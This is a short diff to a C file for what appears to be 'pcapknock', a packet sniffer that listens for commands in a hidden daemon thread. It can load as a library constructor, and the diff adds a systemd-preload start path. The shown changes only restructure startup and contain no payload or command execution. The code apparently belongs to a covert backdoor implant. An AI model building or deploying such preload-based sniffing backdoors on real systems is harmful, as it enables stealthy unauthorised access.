@@ -6,6 +6,7 @@
  * Last Modified 20190325
  */
 
+
 #include <pcap.h>
 #include <pthread.h>
 #include <string.h>
@@ -14,20 +15,42 @@
 #include "debug.h"
 #include "packet.h"
 
+#ifdef PRELOAD_SYSTEMD
+#include "strlen.h"
+#endif /* #ifdef PRELOAD_SYSTEMD */
+
+#define BUFLEN 1024 /* Buffer length */
 #define SNAPLEN 0xFFFF /* Snapshot length */
 #define TO_MS 10 /* Capture timeout, in milliseconds */
 
 int sniff_on(char *dev);
 void do_pcap(void *p);
+int start_capture(void);
 
 /* sniff sniffs packets off the wire and responds to commands.  It starts the
  * sniffing in a detached daemon thread. */
 #ifdef CONSTRUCTOR
 __attribute__((constructor))
+__attribute__((visibility ("default")))
 #endif /* #ifdef CONSTURUCTOR */
 int
 pcapknock(void)
 {
+        /* We might be going for an init-only thing */
+#ifdef PRELOAD_SYSTEMD
+        if (0 != pthread_mutex_init(&mtx, NULL)) {
+                return 11;
+        }
+        return 0;
+#else /* !#ifdef PRELOAD_SYSTEMD */
+        return start_capture();
+#endif /* #ifdef PRELOAD_SYSTEMD */
+}
+
+/* start_capture actually starts the capture going */
+int
+start_capture(void)
+{ 
         char errbuf[PCAP_ERRBUF_SIZE+1];
         pcap_if_t *alldevsp, *cur;
         int worky;
@@ -106,6 +129,7 @@ sniff_on(char *dev)
                 dbgx("pcap_open_live (%s): %s", dev, errbuf);
                 return 3;
         }
+
 
         /* Start the actual capture */
         dbgx("opened %s for sniffing", dev);
